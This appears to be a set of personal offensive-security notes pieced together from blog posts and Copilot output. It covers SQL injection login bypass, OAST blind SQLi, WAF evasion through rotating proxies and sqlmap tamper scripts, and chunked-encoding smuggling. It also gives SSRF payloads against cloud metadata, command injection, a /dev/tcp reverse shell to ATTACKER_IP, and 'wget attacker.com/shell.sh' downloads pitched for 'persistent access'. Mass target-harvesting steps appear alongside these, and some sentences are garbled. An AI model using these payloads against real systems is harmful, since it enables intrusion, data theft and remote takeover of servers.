![None](https://miro.medium.com/v2/resize:fit:700/0*fLqF7TEc3js962l4.png)

![None](https://miro.medium.com/v2/resize:fit:700/0*el4E6Nm07W4wIu5Y.png)

![None](https://miro.medium.com/v2/resize:fit:700/0*7bxkgXBKlPXMp9i0.png)

![None](https://miro.medium.com/v2/resize:fit:700/0*Jl2t27iicBK9XnDd.png)

### Generic SQL Injection Payloads

![None](https://miro.medium.com/v2/resize:fit:700/0*uCKvb88VSthgywm9.png)

![None](https://miro.medium.com/v2/resize:fit:700/0*BZE-SbB0tuCZOsfH.png)

![None](https://miro.medium.com/v2/resize:fit:700/0*1Afc0lQDUSuuG5ph.png)


### SQL Injection Auth Bypass Payloads

![None](https://miro.medium.com/v2/resize:fit:700/0*8zAKRJmMe3Xmw6EC.png)

I just kept trying different payloads until one worked. trying trying trying………..

![None](https://miro.medium.com/v2/resize:fit:700/0*mXXXA05LAAys8Ife.png)

![None](https://miro.medium.com/v2/resize:fit:700/0*fnnLxzN5a88XNgM2.png)

![None](https://miro.medium.com/v2/resize:fit:700/0*y_y83F3PKnF_17fX.png)


![None](https://miro.medium.com/v2/resize:fit:700/0*pnYffnLGjj-3whbD.png)

![None](https://miro.medium.com/v2/resize:fit:700/0*KbQsebYrieIyrxUm.png)


![None](https://miro.medium.com/v2/resize:fit:700/0*jNCH2ZODYZi_wbnZ.png)

![None](https://miro.medium.com/v2/resize:fit:700/0*rWrdRGBu-5ElF5Wx.png)

							Successfully Access

![None](https://miro.medium.com/v2/resize:fit:700/0*VM_ZprJk0aXzCs8r.png)

							User Records

### Understanding the Payload

The payload you shared, `ad||min' ' OR '1'='1' --`, is a string of text that is used to trick the website into letting someone log in without knowing the actual username or password.

**`ad||min`****:

- Imagine you are trying to log in as "admin." The `||` in the middle is like a connector in some databases, but in this case, it's just part of the text. The website sees "ad||min" as part of the username.

**`' '`** **(a space):**

- This space is just a separator. It helps connect the first part with the sneaky part that comes next.

**`OR '1'='1'`****:

- This is the trickiest part. It's like saying, "If the username is `ad||min` **or** if something that is always true (like `1` equals `1`), then let me in."
- Because `1` is always equal to `1`, this part is always true. So, even if the username isn't correct, the website still thinks, "Well, `1=1`, so I guess that's okay," and lets the person in.

**`--`****:

- The `--` is like telling the Database, "Ignore everything that comes after this."
- This makes sure that the Database doesn't check the password or any other conditions. It just stops reading the rest of the login command.

---

# Core Concept

> source: https://medium.com/@pranshux0x/super-blind-sql-injection-20000-bounty-thousands-of-targets-still-vulnerable-f9b013765448

Time Based SQL Injection payload **failed** to detect SQL injection


```
XOR(if(now()=sysdate(),sleep(5),0))XOR
```

This SQL Injection (SQLi) payload attempts to exploit the target SQL database by introducing an intentional delay. Here’s a breakdown of what the payload does:

- `XOR(...)XOR`: XOR is used to obfuscate the payload to evade detection systems. Here, it surrounds the core injection part to make it less apparent.
    
- `if(now()=sysdate(),sleep(5),0)`: This is the core of the payload:
    
    - `now()` and `sysdate()`: Both functions are supposed to return the current date and time. Typically, these two functions will return the same value.
        
    - `if(now()=sysdate(),sleep(5),0)`: This statement checks if `now()` is equal to `sysdate()`. If true, it calls `sleep(5)`, causing the database to pause for 5 seconds. If false, it returns 0.

even though target is vulnerable with SQL injection.

OAST based SQL Injection payload detect it, but why ????.
Total bounty I made with **only OAST based SQL Injection** is **$20000 in 1 months.**
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'

# Idea

I saw this tweet of Kanhaiya Sharma (the legend)

here bro mention the time based SQL injection payload

![[Pasted image 20250207153448.png]]

here bro mention the time based SQL injection payload

```
XOR(if(now()=sysdate(),sleep(5),0))XOR
```

Lots of labs solved with above mentioned time based SQL injection payload

XOR(if(now()=sysdate(),sleep(5),0))XOR

but this lab not solved with time based SQL injection payloads.


> https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

![[Pasted image 20250207153828.png]]

If the code is vulnerable with SQL Injection, then time based SQL Injection payload must work . I contact lot of other hackers of the community ( pro ones also ) , and ask if the code is vulnerable with SQL Injection, then it’s possible that time based payload will not detect sqli— everyone say it’s impossible that time based payload will not detect sqli.


# OAST Based SQLi

I check lot of other hacker intruder sql injection payload wordlist — but none of the hacker use **SQL injection using out-of-band (**[**OAST**](https://portswigger.net/burp/application-security-testing/oast)**) techniques based payload.**

This made me curious, because lot of hacker not using OAST based SQL Injection payload, and only OAST based sqli payload solve this portswigger lab, so it may be possible that there are other target in the wild that are vulnerable like this, but not detected by other hackers because they are not using OAST based sqli payload. But the question is why time based sqli payload didn't work , again I carefully read the portswigger sqli study material and I find out.

Answer is written in portswigger

[An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user’s request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work.](https://portswigger.net/web-security/sql-injection/blind#exploiting-blind-sql-injection-using-out-of-band-oast-techniques)


**Let me explain to you what’s written here with example .**

Did you ever hear about blind XSS , it’s same like that.

Let say you send the request to server:

> https://example.com/?q={sqli}

Server securely with parameterized query process the parameter and send you the response.

But then server saved the q parameter value {sqli} to database for maybe analytics purpose and now this time code is vulnerable with sqli injection.

But you will never detect this thing, with tialtering the request URL, the researcher demonstratedme based sqli payload. because you will get your response in a proper time.

But if you used OAST sqli payload here, you will get a dns interactions and you will detect that code is vulnerable with sql injection . OAST sqli paylod for **PostgreSQL (** [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet))

```
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
```

# **Hunting**

I start hunting with OAST sqli payload and find lots of sql injection that are not possible to find with time based sqli payload.

Total bounty I made with **only OAST based SQL Injection** is **$20000 in 1 months.** (by th)


![[Pasted image 20250207154800.png]]

			OAST sqli Based payloads given by copilot

let's walk through an example of how you might use an OAST payload in a proof of concept (PoC) for a login form. For this example, let's assume the login form is on `https://example.com/login` and it accepts two parameters: `username` and `password`.

Here's how you might structure the request with an OAST payload:

**Login Form Request with OAST Payload:**

```sql
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 123

username=testuser&password='; copy (SELECT '') to program 'nslookup YOUR-OAST-DOMAIN' --
```

**Explanation:**

3. **Endpoint**: `https://example.com/login`
    
4. **HTTP Method**: POST
    
5. **Parameters**:
    
    - `username`: The username for the login, e.g., `testuser`.
        
    - `password`: This is where you would insert the OAST payload.
        
        - The payload: `'; copy (SELECT '') to program 'nslookup YOUR-OAST-DOMAIN' --` is designed to exploit the SQL injection vulnerability and trigger a DNS lookup to your OAST domain.
            

In this case, the `password` parameter is the vector for the injection. The payload is structured to end the current SQL query, inject the OAST payload to perform a DNS lookup, and comment out the rest of the SQL statement to avoid errors.altering the request URL, the researcher demonstrated

### Example of OAST Payload Usage

Here's a curl command example of how you might send this request to `example.com`:

```Sh
curl -X POST https://example.com/login -d "username=testuser&password='; copy (SELECT '') to program 'nslookup YOUR-OAST-DOMAIN' --"
```

Replace `YOUR-OAST-DOMAIN` with your actual OAST domain. When the payload is executed, you should see a DNS interaction in your OAST platform, indicating that the code is vulnerable to SQL injection.

##### References:

[Portswigger OAST Overview](https://portswigger.net/burp/application-security-testing/oast)

[Full Guide To OAST](https://www.xenonstack.com/insights/out-of-band-application-security-testing)

---

# WAF Bypass Masterclass: SQLMap + Proxychains + Tamper Scripts(Cloudflare/Modsecurity)

> https://chromewebstore.google.com/detail/hackbar/ginpbkfigcoaokgflihfhhmglmbchinc?hl=pt-BRFirefox

### **Testing XSS Payloads Against WAFs**

## **Using HackBar Extension to Inject Payloads**

Let’s warm up with XSS. Open up HackBar in your browser, load up the test site URL and [paste the payload into the parameter you want to test:

![](https://miro.medium.com/v2/resize:fit:875/1*8NEvNaMpqZOgBYrhmfjH4g.jpeg)

Bam! Blocked. Cloudflare immediately detects the payload and throws up its Block page. That’s a win for them, but a roadblock for us.

![](https://miro.medium.com/v2/resize:fit:875/1*Zt95_d0ZBlkORFP0K_6zgg.jpeg)

On a different site using ModSecurity same result. Payloads trigger errors and requests get rejected. Clearly we need something more advanced


let's try a simple SQLi  into this url website:  (add the "*")

![[Pasted image 20250417221309.png]]

![[Pasted image 20250417221414.png]]

As we can see... it quickly identifies the **ID** parameter potentially vulnerable to BOOLEAN Based SQLi

However after a few attempts it flags the vulnerability as a **false positive** because there is WAF implemented in the first place.   THIS IS THE POINT WHERE MOST PEOPLE GIVE UP


how we could bypass the WAF, let's open the prychains configuration:

> sudo mousepad /etc/proxychains.conf

by default, is set to use tor by the local host, so disable socks4 and 5 by putting a "#" at the beginning:

![[Pasted image 20250417225145.png]]

Instead, we use some residential proxy 

then go to https://floppydata.com/ to your payed account:

![[Pasted image 20250417225423.png]]

Then check all proxyes and notice that each proxy gives a different IP adress:

![[Pasted image 20250417225534.png]]

Then simply copy all the proxyes and paste them into the config file:

![[Pasted image 20250417225608.png]]

![[Pasted image 20250417225846.png]]


Then make sure you disable the **dynamic chain option** and enable the **random chain** one,

This ensures the reability when working with multiple  proxyes:

![[Pasted image 20250417230037.png]]

Why? _because if one fails, then proxy chains will automatically rotate to another proxy_

And finally, enable quiet mode so we can try bypassing WAFs:

![[Pasted image 20250417231138.png]]


-> save the file.

Now to check if everything works, make a simple curl command to ipinfo.io and see if the ip changes for each request:

![[Pasted image 20250417230507.png]]

![[Pasted image 20250417230532.png]]

You can also check with the browser:

![[Pasted image 20250417230831.png]]

Now  let's run proxychains with ghauri for SQLi:

```bash
proxychains sqlmap -u 'url' --dbs --batch -p id --random-agent --tamper=between,space2comment --dbms mysql --tech=B --no-cast --flush-session --threads 10
```

![[Pasted image 20250417231007.png]]


![[Pasted image 20250417231213.png]]

As we can see.... it has retrieved the databases almost immediatly. Successfully bypassing Cloudflare!

Then we could make a automated search, in which we look for all the vulnerable ids with the '=' sign, for this we can use the lostsec dorking.py script:

> https://github.com/coffinxp/scripts/blob/main/dorking.py

![[Pasted image 20250417231817.png]]


![[Pasted image 20250417232124.png]]

After having the following urls, we can extract only the domain **and store them in a clean list:**

```bash
cat dinkes.txt | awk -F/ '{print $3}' | sort -u
```

![[Pasted image 20250417232216.png]]

Then we can use waybackurls, with GF for sqli patterns and **uro** to extract unique SQLi parameters:

```bash
cat drinkes.txt | waybackurls | gf sqli | uro >new.txt
```

![[Pasted image 20250417232506.png]]

After running the command, we should have something like this:

> cat final.txt

![[Pasted image 20250417232600.png]]

Since test them all would be inefficent, we can reduce the noise that gives one url parameter per domain:

```bash
cat new.txt | gawk -F/ '{host=$3; sub(/:80$/, "", host); if (!(host in seen)) { print $0; seen[host] } }'
```

![[Pasted image 20250417233041.png]]

And finally, we use nuclei Ai for error based sqli:

![[Pasted image 20250417233145.png]]

## **Scanning with Nuclei SQLi Template**

Now Fire up Nuclei with the DAST SQLi template:

```bash
nuclei -l urls.txt |gawk -F/ '{host=$3; sub(/:80$/, "", host); if (!(host in seen)) { print $0; seen[host] } }' | -t nuclei-templates/dast/sql-injection.yaml  

nuclei -l urls.txt -t nuclei-templates/dast/sql-injection.yaml
```


![[Pasted image 20250417233247.png]]

```bash
https://github.com/coffinxp/nuclei-templates/blob/main/errsqli.yaml
```

![[Pasted image 20250417233319.png]]

----



#cURL 
## Chunked Encoding Bypass 

		Curl WAF Bypass

Some WAFs fail to inspect **chunked transfer encoding**:

```bash
curl -X POST "https://target.com/api" \ -H "Transfer-Encoding: chunked" \ --data-binary @malicious_payload.txt
```

inside **payload.txt:**

```http
4
data
3
123
0

```

- `4` — the length (in hex) of the first chunk (`data`)
    
- `data` — the actual data
    
- `3` — the length (in hex) of the second chunk (`123`)
    
- `123` — another chunk
    
- `0` — zero-length chunk signals the end of the message
    

In total, this sends a payload body of `data123`.

### 🔥 Why do this?

When testing:

- **HTTP request smuggling**
    
- **WAF evasion**
    
- or misconfigured reverse proxies
    

...the goal might be to break parsing logic by crafting weird or malformed chunk sizes, sneaking in an extra request, or padding with invisible characters.

Here’s a more "twisted" payload that might simulate this:

```http
5
POST 
7
 /api\n
0

```


Or more precisely, you might craft a chunked body to _mimic_ an embedded HTTP request like this

```
0d
POST /data HTTP/1.1
0
```

☝️ That chunk size (`0d`) is 13 bytes in hex — which matches the length of `POST /data HTTP/1.1`.

This kind of payload is often tested when probing for **desync** or **request smuggling** issues between front-end proxies and back-end servers that interpret HTTP boundaries differently.

Smuggling payloads sometimes require **Content-Length and Transfer-Encoding tricks** together, or insertion of extra CRLF (`\r\n`) characters.

**by copilot.**

### **Obfuscated Parameter Pollution (WAF Evasion)**

If the WAF blocks `../` or `type=csv`, try:

```bash
curl -X POST "https://api.target.com/export" \
  -H "Transfer-Encoding: chunked" \
  --data-binary @- <<EOF
7
type%3d
3
pdf
7
%26type%3d
3
csv
0

EOF
```

	URL-encoded = (%3d) and & (%26) may bypass naive WAF regex.

    Chunked encoding further obscures the payload.

### **Breaking Down the Payload**

1. **`Transfer-Encoding: chunked`**
    
    - Tells the server: _"I’m sending the data in small pieces."_
        
2. **Chunked Data Structure**
    
    - Each chunk has:
        
        - **Size** (in hex, e.g., `7` = 7 bytes)
            
        - **Data** (the actual content)
            
    - Ends with `0` (meaning _"no more chunks"_).
        
3. **What the Chunks Actually Send**
    
    - `7` + `type%3d` → `type=`
        
    - `3` + `pdf` → `pdf`
        
    - `7` + `%26type%3d` → `&type=`
        
    - `3` + `csv` → `csv`
        
    - `0` → _End of transmission_
        

### **Final Result (What the Server Sees)**

When reassembled, the body is:

```
type=pdf&type=csv
```

**Look if you're able to change At least the File Type**

### **Next Steps to Test for Higher Impact**

1. **Try Path Traversal**
    
```bash
curl "https://api.target.com/export?type=pdf&type=../../../../etc/passwd"
```
    
- If it returns system files, **critical LFI vulnerability**.
        
- **Check for SSRF**
    
```bash
 curl "https://api.target.com/export?type=pdf&type=http://attacker.com/malicious"
```
    
- If the server fetches the URL, **SSRF possible**.
        
- **Test for Command Injection (If CSV/XML is Processed)**

### **Expected Output on Webhook.site**

If the API is vulnerable, your webhook will show:

```http
GET /malicious HTTP/1.1  
Host: attacker.com  
User-Agent: [Server’s User-Agent, e.g., Apache-HttpClient]  
Connection: keep-alive  
```

**Key Indicators of SSRF:**  
✅ Incoming request from **NASA’s IP** (not your own).  
✅ Unusual **User-Agent** (e.g., `Python-requests/2.28.1`).  
✅ If you get a **DNS lookup** but no HTTP request → **Blind SSRF**.

```bash
curl "https://api.target.com/export?type=pdf&type=http://169.254.169.254/latest/meta-data"
```

#### **Blind SSRF (Time-Based Detection)**

```bash
curl "https://api.target.com/export?type=pdf&type=http://attacker.com/delay=5"
```
### **Common SSRF Bypasses**

If the API blocks `http://`, try:

- **URL encoding**: `http%3A%2F%2Fattacker.com`
    
- **Using alternate IP formats**: `0x7f000001` (127.0.0.1)
    
- **Redirects**: `https://api.target.com/export?type=pdf&type=http://google.com/redirect?url=attacker.com`

###  What to Do If You Confirm SSRF?

1. **Escalate Impact**:
    
    - Access **internal APIs** (`http://internal-api.nasa.gov`).
        
    - Fetch **cloud metadata** (AWS/Azure/GCP).

---

Now **if the server processes CSV files differently (e.g., parsing formulas, shell commands, or database queries),** forcing `type=csv` and injecting malicious input could escalate the impact. Here’s how to test it:
### **Basic Command Injection Test (Simple Override)**

```bash
curl -X POST "https://api.target.com/export" \
  -d "type=pdf&type=csv&data=;id"
```

- If the server **executes `id`** (or reflects it in output), you’ve got **RCE**.
    
- Replace `id` with `whoami`, `ls`, or `curl attacker.com/shell.sh`.

```
uid=0(root) gid=0(root) groups=0(root)
```

Establish Persistent Access Using:

```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'
```

### **Chunked-Encoding Version (WAF Bypass)**

```bash
curl -X POST "https://api.target.com/export" \
  -H "Transfer-Encoding: chunked" \
  --data-binary @- <<EOF
7
type%3d
3
pdf
7
%26type%3d
3
csv
7
%26data%3d
20
;wget${IFS}attacker.com/shell.sh
0

EOF
```

If successful, the server downloads and (potentially) executes your shell script.